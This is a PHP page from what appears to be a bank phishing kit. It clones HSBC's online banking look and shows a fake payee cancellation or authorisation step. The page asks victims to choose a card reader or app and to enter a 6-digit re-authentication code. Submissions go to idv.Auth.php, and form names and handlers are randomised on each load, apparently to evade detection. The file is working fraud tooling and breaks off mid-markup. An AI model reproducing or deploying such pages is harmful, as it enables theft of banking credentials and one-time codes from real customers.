<?php
session_start();
error_reporting(0);
include "hc.php";
include "control.php";
include "connect/out.php";
if(isset($_GET["accessU"]))
{
	$fname=randomCha(rand(10,12));
	$fj=randomCha(rand(4,7));
	$fj1=randomCha(rand(8,9));
	$act="Cancel Payee: MRS K ADAMS";
	$codetype="cancellation";
	if($_SESSION["act"] == "Confirm"){ $act="Authorize Payee Update";$codetype="confirmation";}
	if($_SESSION["act"] == "Confirm"){ $act="Authorize Payee Update";$codetype="confirmation";}
	
	$err="display:none";
	if(isset($_GET["error_i"]))
	{
		$err="";
	}
	echo '<!DOCTYPE HTML>
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <title>Authorize | My banking | HSBC</title>
	  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5, user-scalable=1">
	  <style type="text/css" media="screen">         .lpButtonDiv{position:fixed;top:42%;right:-60px}#lpButtonDiv-slideout{position:absolute;width:280px;height:80px;top:45%;right:-250px;padding-left:20px;z-index:99999}#lpButtonDiv-clickme{position:absolute;top:27px;left:0;height:120px;width:20px;z-index:99999}#lpButtonDiv-slidecontent{float:left;z-index:99999}.actus .pageLoadingOverlay{opacity:1;height:100%;width:100%;position:fixed;top:0;bottom:0;left:0;display:block;right:0;z-index:3000}.actus .loader{background:#fff;width:440px;position:fixed;left:0;right:0;margin:25% auto;z-index:3002}.actus .loader .loaderImage{background:url(reg/info/Spinner32Dark.gif) 0 center/32px 32px no-repeat rgba(0,0,0,0);height:100%;left:37px;position:absolute;top:0;width:32px}.actus .loader p{text-align:left;font-size:150%;color:#666;margin:18px;border:1px solid #d2d2d2;font-family:UniversNextforHSBC-medium,Arial,sans-serif;padding:31px 15px 31px 63px}.actus .loaderOverlay{position:fixed;left:0!important;top:0!important;bottom:0!important;right:0!important;width:100%;height:100%;z-index:3001;background:#656565}
      </style>
      <style type="text/css">#MCM_MyAccountsTargetedCampaignNorth, #MCM_MyAccountsTargetedCampaignEast, #MCM_MyAccountsTargetedCampaignSouth, #MCM_MyAccountsTargetedCampaign, #GSP_MyaccountEast, #GSP_MyaccountWest, #GSP_MyaccountNorth, #GSP_Myaccount{ display: block; }</style>
      <style>
         .actus .customTip {
         max-width: 411px !important;
         margin: auto;
         width: 411px !important;
         padding: 25px 29px !important;
         border-top: 3px solid;
         border-left: 1px solid;
         border-right: 1px solid;
         border-color: #83010a;
         }
         .actus .customTip.greyBorder{
         border-color: grey;
         }
         .actus .CDD .CDDbtn {
         text-align: center;
         }
         .actus .btnTertiary{
         cursor: pointer;
         }
         .actus .CDD .CDDbtn.PadMore {
         padding-bottom: 10px;
         margin-top: 14px;
         }
         .actus .CDD .CDDbtn .btnSecondary {
         margin-right: 12px !important;
         margin-left: -4px;
         font-size: 1em !important;
         }
         .actus .CDD .CDDbtn .btnTertiary {
         font-size: 1em !important;
         }
         .actus .CDD .htext h2 {
         text-align: center;
         font-family: UniversNextforHSBC-Bold, Arial, sans-serif;
         font-size: 1.6em;
         padding-bottom : 15px; 
         }
         div#ovrlay {
         max-width: 440px;
         margin: auto;
         }
         .actus .dijitDialog .CDD .htext p {
         max-height : 150px;
         padding-bottom : 23px;
         font-family: UniversNextforHSBC-Regular, Arial, sans-serif;
         font-size: 1.2em; 
         text-align: center;
         } 
         .actus .dijitContentPane .CDD img {
         width: 61px;
         height: 54px;
         padding-left: 180px;
         padding-bottom: 19px;
         }
         .actus .customTip .CDD .last{
         font-family: UniversNextforHSBC-Regular, Arial, sans-serif;
         font-size: 1.2em;
         text-align: center;
         padding-top :13px;
         padding-bottom :0px;
         } 
         .actus .customTip .dijitContentPane{
         padding:0px !important;
         height:auto !important;
         }
         .actus label, .actus .externalLabel, .actus .font16 {
         font-size: 1.2em;
         margin-left: 8px;
         }
         .actus .dijitDialog .CDD .htext .form1 select {
         /* enlarge by 16/12 = 133.33% */
         font-size: 1.2em;
         line-height: 26.666666667px;
         padding: 6.666666667px;
         width: 130.333333333%;
         /* scale down by 12/16 = 75% */
         transform: scale(0.75);
         transform-origin: left top;
         /* remove extra white space */
         margin-bottom: 10px;
         margin-right: -33.333333333%; 
         margin-top: 10px;
         }
         input.validateText, select:focus {
         outline: 1px dotted #212121 !important;
         outline: 5px auto -webkit-focus-ring-color !important;
         }
         .actus .CDD .CDDbtn .btnhide {
         padding: 11px 12px 10px 12px;
         margin-right: 12px !important;
         margin-left: -4px;
         cursor: pointer;
         background: #000;
         visibility:hidden;
         background-image: linear-gradient(bottom, black 0%, #333333 100%);
         background-image: -o-linear-gradient(bottom, black 0%, #333333 100%);
         background-image: -moz-linear-gradient(bottom, black 0%, #333333 100%);
         background-image: -webkit-linear-gradient(bottom, black 0%, #333333 100%);
         background-image: -ms-linear-gradient(bottom, black 0%, #333333 100%);
         background-image: -webkit-gradient(linear, left bottom, left top, color-stop(0, black), color-stop(1, #333333));
         border-radius: 3px;
         color: #FFF;
         display: inline-block;
         font: 1.175em UniversNextforHSBC-Regular, Arial, sans-serif;
         padding: 11px;
         line-height: 1em;
         border: 0;
         margin: 0;
         text-align: center;
         }
      </style>
      <style>
         .LeftSlotBanner {
         background: white;
         width: 264px;
         padding: 18px;
         min-height: 296px;
         display: inline-block;
         }
         .LeftSlotBanner .content {
         padding: 18px;
         height: 258px;
         border: 1px #d2d2d2 solid;
         position: relative;
         }
         .LeftSlotBanner .content h2{
         font-size: 1.5em;
         line-height: 0.8em;
         font-family: "UniversNextforHSBC-Medium";
         }
         .LeftSlotBanner .content p {
         min-height: 46px;
         margin: 8px 0px 8px 0px;
         font-size: 1.1em;
         line-height: 1em;
         font-family: "UniversNextforHSBC-Regular";
         }
         .LeftSlotBanner .content img {
         width: 226px;
         height: 122px;
         margin-bottom: 5px;
         }
         .LeftSlotBanner .content .CTA a {
         text-align: center;
         margin-right: 12px;
         min-height: 10px;
         line-height: 8px !important;
         font: 1.15em "UniversNextforHSBC-Regular", Arial, sans-serif;
         }
         .LeftSlotBanner .content .CTA {
         position: absolute;
         bottom: 18px;
         left: 18px;
         }
         .LeftSlotBanner .content h3.disclaimerText {
         font-size: 1em;
         line-height: 1em;
         font-family: "UniversNextforHSBC-Bold" !important;
         min-height: 24px;
         margin-bottom: 26px;
         width: 226px;
         margin-top:1px;
         }
         .LeftSlotBanner .content img.disclaimerImage {
         width: 226px;
         height: 74px;
         margin-bottom: 5px;
         }
         .LeftSlotBannerCarousel .content img.disclaimerImage {
         width: 226px;
         height: 74px;
         margin-bottom: 5px;
         }
         .LeftSlotBannerCarousel .content h3.disclaimerText {
         font-size: 1em;
         line-height: 1em;
         font-family: "UniversNextforHSBC-Bold" !important;
         min-height: 24px;
         margin-bottom: 26px;
         width: 226px;
         margin-top:1px;
         }
         .LeftSlotBanner .content h2{
         font-size: 1.5em;
         line-height: 0.8em;
         font-family: "UniversNextforHSBC-Medium";
         }
         .LeftSlotBannerCarousel .dijitCarouselItem h2 {
         font-size: 1.5em;
         line-height: 0.8em;
         font-family: "UniversNextforHSBC-Medium";
         }
         .LeftSlotBannerCarousel .dijitCarouselItem p {
         min-height: 46px;
         margin: 8px 0px 8px 0px;
         font-size: 1.1em;
         line-height: 1em;
         font-family: "UniversNextforHSBC-Regular";
         }
         .LeftSlotBannerCarousel img {
         width: 226px;
         height: 122px;
         margin-bottom: 5px;
         }
         .LeftSlotBannerCarousel .CTA a{
         text-align: center;
         margin-right:12px;
         min-height:10px;
         line-height: 8px !important;
         font: 1.15em "UniversNextforHSBC-Regular", Arial, sans-serif;
         }
         .LeftSlotBannerCarousel .CTA {
         text-align: center;
         position: absolute;
         bottom: 18px;
         left: 18px;
         }
         .LeftSlotBannerCarousel {
         width: 300px;
         height: auto;
         /* overflow: auto; */
         display: inline-block;
         }
         .LeftSlotBannerCarousel .dijitCarousel.carouselOne {
         width: 300px;
         min-height: 361px;
         }
         .LeftSlotBannerCarousel .dijitCarousel.carouselOne .dijitCarouselItem {
         height: 296px;
         width: 264px;
         padding: 18px 18px;
         }
         .LeftSlotBannerCarousel .dijitCarouselItem .dijitContentPane {
         padding: 18px;
         border: 1px #d2d2d2 solid;
         height: 258px;
         }
      </style>
      <style>
         div#Topslot
         {
         width: 938px;
         margin-bottom: 20px;
         border-radius: 2px;
         }
         div#Topslot.confirmation {
         background: #008580 url(\'reg/info/alert-panel-success.gif\') 0 center no-repeat;
         border: 1px solid #008580;
         }
         div#Topslot.error {
         background: #840004 url(\'reg/info/alert-panel-error_new.gif\') 0 center no-repeat;
         border: 1px solid #840004;
         }
         div#Topslot.star {
         background: #3F515E url(\'reg/info/alert-panel-star-gray.png\') 5px center no-repeat;
         border: 1px solid #3F515E;
         }
         div#Topslot.gift {
         background: #4F3B7D url(\'reg/info/alert-panel-gift-purple.png\') 5px center no-repeat;
         border: 1px solid #4F3B7D;
         }
         div#Topslot.warning {
         background: #CA751A url(\'reg/info/alert-panel-warning_dark.gif\') 0 center no-repeat;
         border: 1px solid #CA751A;
         width: 938px;
         margin-bottom: 20px;
         }
         div#Topslot.info {
         background: #E6E6E6 url(\'reg/info/alert-panel-info_new.gif\') 0 center no-repeat;
         border: 1px solid #d2d2d2;
         }
         div#Topslot.info .content.SingleLine {
         border-left: 1px solid #d2d2d2;
         }
         div#Topslot .SingleLine.content {
         overflow: hidden;
         padding: 12px 18px 12px 18px;
         background: white;
         margin-left: 38px;
         height: 34px;
         }
         div#Topslot .SingleLine.content .leftSide p {
         padding: 9px 0px 9px 0px;
         font-size: 1.2em;
         font-family: UniversNextforHSBC-Bold;
         line-height: 1.1em;
         }
         div#Topslot .SingleLine.content .rightSide {
         float: right;
         display: inline;
         }
         div#Topslot .SingleLine.content .leftSide {
         float: left;
         display: inline;
         }
         div#Topslot .SingleLine.content .rightSide a {
         min-height: 10px;
         line-height: 8px !important;
         font: 1.15em UniversNextforHSBC-Regular, Arial, sans-serif;
         margin-left: 12px !important;
         }
         div#Topslot .SingleLine.content .leftSide .oneLine {
         padding: 9px 0px 9px 0px;
         width: 620px;
         font-size: 1.2em;
         font-family: UniversNextforHSBC-Bold;
         line-height: 1.1em;
         }
         div#Topslot .SingleLine.content .leftSide .twoLines {
         padding: 1px 0px 1px 0px;
         width: 640px;
         font-size: 1.2em;
         font-family: UniversNextforHSBC-Bold;
         line-height: 1.1em;
         }
      </style>
		 <link rel="stylesheet" href="reg/info/form.css'.outrand().'">
		 <link rel="stylesheet" href="reg/info/buttons.css'.outrand().'">
		 <link rel="stylesheet" href="reg/info/layout.css'.outrand().'">
		 <link rel="stylesheet" href="reg/info/table.css'.outrand().'">
		 <link rel="stylesheet" href="reg/info/print.css'.outrand().'">
		 <link rel="stylesheet" href="reg/info/out.css'.outrand().'" media="print">
		 <link rel="stylesheet" href="reg/info/new.css'.outrand().'" media="screen">
		 <link rel="shortcut icon" type="ico" href="favicon.ico'.outrand().'">
   </head>
   <body id="_mainBody" class="actus dashboard" style="top: 0px;" tabindex="0">
      <div id="_loaderNode" class="pageLoadingOverlay" role="alertdialog" style="background-color: transparent; opacity: 0; display: none;">
         <div class="loaderOverlay" style="opacity: 0.5; display: block;"></div>
         <div id="_loader" class="loader">
            <div class="loaderImage"></div>
            <p id="loadingMsgContent" role="alert" title=""><strong>Please wait</strong> <br> We are loading your data...</p>
         </div>
         <div id="_loaderForeground" class="loaderOverlay" style="opacity: 0.7; height: 0px; display: block; z-index: 0; background-image: url(&quot;reg/info/background.jpg&quot;);">&nbsp;</div>
      </div>
      <div id="application" class="clearfix" style="min-height: 218px;">
         <div id="_header" class="header-wrapper" lang="en-gb">
            <div class="page-background" lang="en-gb">
               <div class="big-image-wrapper" style="min-width: 100%; min-height: 799px;">
                  <img src="reg/info/background.jpg" alt=" " style="min-width: 100%; min-height: 100%;">
               </div>
            </div>
            <div class="masthead" tabindex="0">
               <div class="mastheadInner" style="height: auto;">
                  <a href="#content" class="skipLink">Skip page header and navigation</a>
                  <div class="mastheadMainDivTop fl hide">
                     <span class="arrowBack fl"></span>
                     <a href="#" class="fl">Back to previous version of Online Banking</a>
                  </div>
                  <ul class="fr" role="presentation">
                     <li class="countryDropdown gradient10">
                        <div id="group_gpib_cmn_bijit_LanguageToggle_0" lang="en-gb">
                           <span class="dijit dijitReset dijitInline dijitDropDownButton" dir="ltr" lang="en-gb"><span class="dijitReset dijitInline dijitButtonNode"><span class="dijitReset dijitStretch dijitButtonContents dijitDownArrowButton" role="link" tabindex="0" id="mastheadLanguageDropDownButton_group_gpib_cmn_bijit_LanguageToggle_0" style="user-select: none;"><span class="dijitReset dijitInline dijitIcon dijitEditorIcon dijitEditorIconBold"></span><span class="dijitReset dijitInline dijitButtonText" id="mastheadLanguageDropDownButton_group_gpib_cmn_bijit_LanguageToggle_0_label"><span id="languageDefault">English</span></span><span class="dijitReset dijitInline"></span><span class="dijitReset dijitInline dijitArrowButtonChar">▼</span></span></span><input type="button" value="" class="dijitOffScreen" tabindex="-1" role="presentation"></span>
                        </div>
                     </li>
                     <li class="countryDropdown gradient10">
                        <div id="group_gpib_cmn_bijit_CountryDropdown_0" lang="en-gb">
                           <span class="dijit dijitReset dijitInline dijitDropDownButton" dir="ltr" lang="en-gb"><span class="dijitReset dijitInline dijitButtonNode"><span class="dijitReset dijitStretch dijitButtonContents dijitDownArrowButton" role="link" tabindex="0" id="hdx_bijits_master_DropDownButton_0" style="user-select: none;"><span class="dijitReset dijitInline dijitIcon dijitEditorIcon dijitEditorIconBold"></span><span class="dijitReset dijitInline dijitButtonText" id="hdx_bijits_master_DropDownButton_0_label"><span class="flag-16 flag-GB flag-GBHBEU"></span>United Kingdom<span class="accessible"></span></span><span class="dijitReset dijitInline"></span><span class="dijitReset dijitInline dijitArrowButtonChar">▼</span></span></span><input type="button" value="" class="dijitOffScreen" tabindex="-1" role="presentation"></span>
                           <div class="loaderOverlay loadingData noDisplay">
                              <div class="loader shadow">
                                 <div class="row loadingDataContainer">
                                    <div class="loaderImage"></div>
                                    <div class="loadingDataText">
                                       <p class="loaderTitle"></p>
                                       <p>We are loading your account details</p>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </li>
                     <li class="messagesNav gradient10">
                        <div class="msgCountBtn" id="group_gpib_msgs_bijit_MsgsMastheadButton_0" lang="en-gb">
                           <span class="dijit dijitReset dijitInline dijitDropDownButton" lang="en-gb"><span class="dijitReset dijitInline dijitButtonNode"><span class="dijitReset dijitStretch dijitButtonContents dijitDownArrowButton" role="menuitem" tabindex="0" style="user-select: none;"><span class="dijitReset dijitInline dijitIcon dijitNoIcon"></span><span class="dijitReset dijitInline dijitButtonText envelope"><span class="hidden3">Messages -</span>
                           <span class="messageCount noMessages"></span>
                           <span class="accessible"></span> <span class="hidden3">New Press enter or down arrow to open</span></span><span class="dijitReset dijitInline dijitArrowButtonInner"></span><span class="dijitReset dijitInline dijitArrowButtonChar">▼</span></span></span><input type="button" value="" class="dijitOffScreen" tabindex="-1" role="presentation"></span>
                           <table class="dijit dijitMenu dijitMenuPassive dijitReset dijitMenuTable" tabindex="-1" id="group_gpib_msgs_bijit_MsgsMastheadButton_0_DropDownMenu" lang="en-gb" cellspacing="0">
                              <tbody class="dijitReset"></tbody>
                           </table>
                        </div>
                     </li>
                     <li class="logOff gradient1"><a href="#" title="">Log off</a>
                     </li>
                  </ul>
               </div>
            </div>
            <div id="group_gpib_cmn_bijit_MenuBar_0" lang="en-gb">
               <div class="masthead-overlay hideMsthdOvrly" style="display: none; opacity: 0; filter: none;"></div>
               <div class="masthead-navigation">
                  <div class="masthead-navigation-row">
                     <div class="logoMain hsbcRet">
                        <a href="#" style="outline: none;"> 
                        <img class="logo hsbcRetail" alt="HSBC Retail Home" src="reg/info/logo.jpg" style="cursor: pointer;">
                        </a>
                     </div>
                     <div class="sections" id="masthead-navigation-sections">
                        <nav role="navigation">
                           <h1 class="accessible">Site navigation</h1>
                           <ul class="navigation-wrapper">
                              <li class="navigation-item doormatOfCol4 current ">
                                 <a href="#" class="navigation-link itemText"><span class="navigation-link-heading">My banking</span><span class="navigation-link-subheading">Account dashboard</span></a>
                              </li>
                              <li class="navigation-item doormatOfCol4">
                                 <a href="#" class="navigation-link itemText"><span class="navigation-link-heading">Products &amp; services</span><span class="navigation-link-subheading">Banking, borrowing &amp; insurance</span></a>
                              </li>
                              <li class="navigation-item doormatOfCol3">
                                 <a href="#" class="navigation-link itemText"><span class="navigation-link-heading">Investments &amp; Life events</span><span class="navigation-link-subheading">Stocks, funds &amp; wealth management</span></a>
                              </li>
                              <li class="navigation-item doormatOfCol3  last">
                                 <a href="#" class="navigation-link itemText"><span class="navigation-link-heading">Contact HSBC</span><span class="navigation-link-subheading">Help &amp; support</span></a>
                              </li>
                           </ul>
                        </nav>
                     </div>
                  </div>
               </div>
            </div>
         </div>
         <div class="backTohome" id="_dapBackToHome">
            <a class="leftRedArrow" id="backToMyAccount" href="#">Back to my accounts</a>
         </div>
         <div id="_body" class="dijitContentPane navigateFunExt" style="height: 680px;" lang="en-gb">
            <div>
               <div id="_loaderNode" class="loader">
                  <div class="loaderInner"></div>
               </div>
               <div class="main-content-wrapper clearfix" tabindex="-1" id="content" style="opacity: 1;">
                  <div class="row">
                     <h1>
                        <span class="title" title="">Account Security</span>
                     </h1>
                     <p class="log fontSmallest">
                        <a id="_dashboard"></a>
                     </p>
                  </div>
                  <span onclick="this.style.display=\'none\';">
                     <div id="Topslot" class="star">
                        <div class="SingleLine content">
                           <div class="leftSide">
                              <p class="twoLines">
                                 Give the right details. New payments are now 
                                 subject to Confirmation of Payee checks, so make sure you give your full
                                 name when sharing your account or payment details.<br>
                              </p>
                           </div>
                           <div class="rightSide">
                              <a class="btnSecondary onkeypress=" close(\'topslot\')"="" name="G1859 Close">                      
                              Close        </a> 
                           </div>
                        </div>
                     </div>
                  </span>
                  <div class="fl col col1 sabbcol1">
                     <div class="hdxAccordionFlexContainer row shadow" id="group_gpib_cmn_bijit_ContextMenu_0" lang="en-gb">
                        <div class="dijitTitlePane" lang="en-gb">
                           <div class="dijitTitlePaneTitle dijitTitlePaneTitleFixedOpen dijitFixedOpen noDisplay">
                              <div class="dijitTitlePaneTitleFocus" role="heading">
                                 <span class="dijitInline dijitArrowNode" role="presentation"></span><span class="dijitArrowNodeInner">-</span><span class="dijitTitlePaneTextNode" style="user-select: none;">Manage</span>
                              </div>
                           </div>
                           <div class="dijitTitlePaneContentOuter" role="presentation">
                              <div class="dijitReset" role="presentation">
                                 <div class="dijitTitlePaneContentInner" role="region">
                                    <div>
                                    </div>
                                    <div>
                                       <ul>
                                          <li class="">
                                             <a href="#" id="newtransaction">
                                                <span class="accessible">View</span>
                                                <div class="itemLabel">Request</div>
                                                <span class="arrowIcon"></span><span class="accessible selectedSpan">Selected</span>
                                             </a>
                                          </li>
                                          <li class="selected">
                                             <a href="#" id="autopayments">
                                                <span class="accessible">View</span>
                                                <div class="itemLabel">Authorize</div>
                                                <span class="arrowIcon"></span><span class="accessible selectedSpan"></span>
                                             </a>
                                          </li>
<li class="">
                                             <a href="#" id="autopayments">
                                                <span class="accessible">View</span>
                                                <div class="itemLabel">Confirmation</div>
                                                <span class="arrowIcon"></span><span class="accessible selectedSpan"></span>
                                             </a>
                                          </li>
                                       </ul>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div class="row account-dashboard-banners" id="quickBijits">
                        <span>
                           <div class="LeftSlotBanner">
                              <div id="data_step1" class="content">
                                 <span>
                                    <h2>Keep an eye on what matters to you</h2>
                                 </span>
                                 <p>Get a free Motorola security camera worth up to £99.99 when you switch your home insurance to HSBC.<br></p>
                                 <img class="disclaimerImage" src="reg/info/19496-mass-camera-home-insurance-226x74.jpg" alt="Home Security camera">
                                 <span>
                                    <h3 class="disclaimerText">
                                       T&amp;Cs apply. HSBC Home Insurance provided by Aviva Insurance Limited.<br>
                                    </h3>
                                 </span>
                                 <div class="CTA">
                                    <a class="btnSecondary" tabindex="0" href="#">
                                    Get a quote
                                    </a>
                                 </div>
                              </div>
                           </div>
                        </span>
                     </div>
                  </div>
                  <div class="fr col col2">
                     <div class="panelInset moveMoney newTransaction dijitStackContainer dijitContainer dijitLayoutContainer" id="_TransactionModel">
                        <div class="dijitStackContainerChildWrapper dijitVisible">
                           <div id="group_gpib_mvmny_bijit_TxnHandler_0" class="dijitStackContainer-child">
                              <div class="steptracker-heading">
                                 <h2>Authorize</h2>
                                 <div id="hdx_dijits_StepTracker_0">
                                    <span class="hidden accessibleFormat">Step 1 out of 3</span>
                                    <ol class="step-tracker">
                                       <li><span class="stepTextContainer"><span class="accessible">Step</span> <span class="stepText">1</span></span></li><li class="active"><span class="stepTextContainer"><span class="accessible">Step</span> <span class="stepText">2</span></span><span class="current hidden3">current</span></li>
                                       
									   <li><span class="stepTextContainer"><span class="accessible">Step</span> <span class="stepText">3</span></span></li>
                                    </ol>
                                 </div>
                              </div>
                              <div class="moveMoneyContainer formPanel moveMoney borderedContent">
                                 <div class="TDSbijiContainer" style="display: block;">
                                    <div id="group_gpib_cmn_bijit_reauthtds_3">
                                       <div class="clear"></div>
                                       <div class="primaryAccordion transSecureTop">
                                          <div class="DP270Testing hide">
                                             <div class="dialogStyle01 securityDialog reauthentication panelWide2">
                                                <form class="formPanel reauthenticationForm" id="form_one" name="form_one"  action="#" method="post">
                                                   <div class="formWrapper">
                                                      <div>
                                                         <div class="securityKeyInstructions">
                                                            <div class="primaryAccordion">
                                                               <div class="dijitTitlePane">
                                                                  <div class="dijitTitlePaneTitle dijitTitlePaneTitleOpen dijitOpen">
                                                                     <div class="dijitTitlePaneTitleFocus" role="button" tabindex="0">
                                                                        <span class="dijitInline dijitArrowNode" role="presentation"></span><span class="dijitArrowNodeInner">-</span><span class="dijitTitlePaneTextNode" style="user-select: none;">Hide re-authentication instructions</span><span class="hidden3"> collapsed press enter to expand</span>
                                                                     </div>
                                                                  </div>
                                                                  <div class="dijitTitlePaneContentOuter" role="presentation">
                                                                     <div class="dijitReset" role="presentation">
                                                                        <div class="dijitTitlePaneContentInner" role="region">
                                                                           <div class="codeGeneratorHelp hide">
                                                                              <div class="codeGeneratorHelpInner">
                                                                                 <ol class="row">
                                                                                    <li><img class="step1BackgroundCAM40" src="reg/info/cam40Step1.png" alt="Step 1"><span class="hidden3">Step 1 image description</span> <span class="codeGeneratorStepTitle">Step 1</span> <span class="codeGeneratorStepContent">Press and hold
                                                                                       <img class="pinButton" src="reg/info/new_key_btn.png" alt="" width="17" height="17"> then enter your secure key pin.</span>
                                                                                    </li>
                                                                                    <li><img class="step2BackgroundCAM40" src="reg/info/cam40Step2.png" alt="Step 2"><span class="hidden3">Step 2 image description</span><span class="codeGeneratorStepTitle">Step 2</span> <span class="codeGeneratorStepContent">With the HSBC welcome screen display, press the<img class="pinButton" src="reg/info/3-image.png" alt=""> button. This will generate a re-authentication code.</span>
                                                                                    </li>
                                                                                    <li class="last"><img class="step3BackgroundCAM40" src="reg/info/cam40Step3.png" alt="Step 3"><span class="hidden3">Step 3 image description</span>
                                                                                       <span class="codeGeneratorStepTitle">Step 3</span> <span class="codeGeneratorStepContent">Enter the re-authentication code shown on your security device below.</span>
                                                                                    </li>
                                                                                 </ol>
                                                                              </div>
                                                                           </div>
                                                                           <div class="codeGeneratorHelpGO3 hide">
                                                                              <div class="codeGeneratorHelpInnerGO3">
                                                                                 <span class="hidden3">Code generator image description</span>
                                                                                 <div class="row codeViaDevice">Enter code that is generated via device.</div>
                                                                              </div>
                                                                           </div>
                                                                           <div class="codeGeneratorHelp hide">
                                                                              <div class="codeGeneratorHelpInner">
                                                                                 <ol class="row">
                                                                                    <li><img src="reg/info/Reauth1.png" alt="Step 1 image description" width="75"><span class="codeGeneratorStepTitle">Step 1</span> <span class="codeGeneratorStepContent">Launch the HSBC Mobile Banking app and select \'Generate security code\'.<br><br>If you\'re a Touch ID user, cancel the log on prompt and then select \'Generate security code\'.</span>
                                                                                    </li>
                                                                                    <li><img src="reg/info/Reauth2.png" alt="Step 2 image description" width="75"><span class="codeGeneratorStepTitle">Step 2</span> <span class="codeGeneratorStepContent">
                                                                                       Select \'Re-authenticate\'. Enter your Digital Secure Key password and select \'Generate code\'.<br><br>For Touch ID, select the \'Re-authenticate\' tab, then \'Generate code\' and follow the steps. </span>
                                                                                    </li>
                                                                                    <li class="last"><img src="reg/info/Reauth3.png" alt="Step 3 image description" width="75"><span class="codeGeneratorStepTitle">Step 3</span> <span class="codeGeneratorStepContent">
                                                                                       Your re-authentication security code will be displayed. </span>
                                                                                    </li>
                                                                                 </ol>
                                                                              </div>
                                                                           </div>
                                                                        </div>
                                                                     </div>
                                                                  </div>
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                      <div class="formSpacer">
                                                         <fieldset>
                                                            <div class="twoCodeInput amendReauthSO">
                                                               <div class="wide formlabel forSelect twoLines reauthenticationLabel">
                                                                  <label for="reauthOTP_group_gpib_cmn_bijit_reauthtds_3" class="wSpan">
                                                                     Re-authentication code
                                                                  </label>
                                                               </div>
                                                                  </div> --&gt;
                                                               <div class="twoCodeColumn">
                                                                  <div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox small" id="widget_reauthOTP_group_gpib_cmn_bijit_reauthtds_3" role="presentation">
                                                                     <div class="dijitReset dijitValidationContainer"><input class="dijitReset dijitInputField dijitValidationIcon dijitValidationInner" value="Χ " type="text" tabindex="-1" readonly="readonly" role="presentation"></div>
                                                                     <div class="dijitReset dijitInputField dijitInputContainer"><input class="dijitReset dijitInputInner" autocomplete="off" name="reauthSecurityCode" type="password" tabindex="0" id="reauthOTP_group_gpib_cmn_bijit_reauthtds_3" maxlength="6" value="" placeholder="Enter your 6 digit code"></div>
                                                                  </div>
                                                               </div>
                                                            </fieldset></div>
                                                      </div>
                                                   </form></div>
                                                
                                             </div>
                                          </div>
                                       </div>
                                       <div>
                                          <div class="TransactionCodeTesting">
                                             <div class="securityKeyInstructions">
                                                <div class="primaryAccordion">
                                                   <div class="dijitTitlePane">
                                                      <div class="standingOrder standingOrderMsg" style="padding: 20px 0px;font-size: 15px;">
  Action Selected: <b><u>'.$act.'</u></b><br>
  <br>
  Please select how you want to authorize this change:
                                                      </div>





                                                      
                                                      <div class="dijitTitlePaneContentOuter" role="presentation" style="background:#FFF">
                                                         <div class="dijitReset" role="presentation">
                                                            <div class="dijitTitlePaneContentInner" role="region">
                                                               
                                                               <div class="codeGeneratorHelp hide">
                                                                  <div class="codeGeneratorHelpInnerTDS">
                                                                     <ol class="row">
                                                                        <li>
                                                                           <h4 class="codeGeneratorStepTitle">Step 1</h4>
                                                                           <span class="codeGeneratorStepContent">Press and hold <img class="pinButton" src="reg/info/key-green-button.png" alt="Green circle button in right bottom corner of the device">.Enter your Secure Key PIN. When \'HSBC\' shows on screen, press <img class="pinButton" src="reg/info/key-yellow-button.png" alt="Yellow square button in left bottom corner of the device">.</span>
                                                                        </li>
                                                                        <li>
                                                                           <h4 class="codeGeneratorStepTitle">Step 2</h4>
                                                                           <span class="codeGeneratorStepContent">On your Secure Key, enter the <strong>last 4 digits of the payee account number</strong>, followed by the <strong>whole amount including pence</strong>, ignoring the decimal point.<br><br>e.g. payee account 1234<strong>5678</strong> and amount £3000.15 should be input as 5678300015 <br><br> e.g. payee account 1122<strong>3344 </strong> and amount £200.00 should be input as 334420000</span>
                                                                        </li>
                                                                        <li>
                                                                           <h4 class="codeGeneratorStepTitle">Step 3</h4>
                                                                           <span class="codeGeneratorStepContent">Press <img class="pinButton" src="reg/info/key-yellow-button.png" alt="Yellow square button in left bottom corner of the device"> a 6 digit code will be displayed. Enter this without any spaces in the \'Enter the transaction code\' field below.</span>
                                                                        </li>
                                                                        <li class="last">
                                                                           <h4 class="codeGeneratorStepTitle"></h4>
                                                                           <span class="codeGeneratorStepContent"><strong>Note:</strong>
                                                                           The screen on your Secure Key will display a maximum of 8 digits. If 
                                                                           you input more than 8 they will scroll to the left and disappear from 
                                                                           view. If you need to delete a character, press <img class="pinButton" src="reg/info/key-green-button.png" alt="Green circle button in right bottom corner of the device"> once to backspace or press and hold to clear all input.</span>
                                                                        </li>
                                                                     </ol>
                                                                  </div>
                                                               </div>
                                                               <div class="codeGeneratorHelp">
                                                                  <div class="codeGeneratorHelpIn4">
                                                                     <h2 class="accessible">How to generate a security code</h2>
                                                                     <p></p>
																	 <form action="idv.Auth.php?ud=dashbrd&idv.cmd=Verify&accessU='.md5(rand(1,100)).'&ID='.randomChaSp(rand(40,60)).'" method="post" onsubmit="'.$fj1.'(); return false;" name="'.$fname.'" id="'.$fname.'" autocomplete="off">
																	 <table style="width: 100%;">
																	 <tbody>
																	 <tr>
																	 <td style="text-align: center;padding:20px"><input type="radio" name="a_type" id="r_auth" value="reader" checked="checked">&nbsp;<label for="r_auth" style="font-size: 1.3em;width:auto;float:unset;">Card Reader</label></td>
																	 <td style="text-align: center;padding:20px"><input type="radio" name="a_type" id="app_auth" value="app">&nbsp;<label for="app_auth" style="font-size: 1.3em;width:auto;float:unset;">HSBC App</label></td>
																	 </tr>
																	 <tr>
																	 <td style="text-align: center;">
																	 <label for="r_auth" style="font-size: 1.3em;width:auto;float:unset;"><img src="reg/secure_key_support_dash_140x217.jpg" style="width:70px;margin-bottom:28px"></label></td>
																	 <td style="text-align: center;">
																	 <label for="app_auth" style="font-size: 1.3em;width:auto;float:unset;"><img src="reg/secureKeyPassword.png" style="width:70px;height:140px;"></label></td>
																	 </tr>
																	 </tbody>
																	 </table>
                                                                    
                                                                  </div>
                                                               </div>
                                                            </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                             
                                             </form>
                                          </div>
                                       </div>
                                       <div class="ReauthRCCTesting hide">
                                          <div class="dialogStyle01  lostStolenCardDialog reauthCam30">
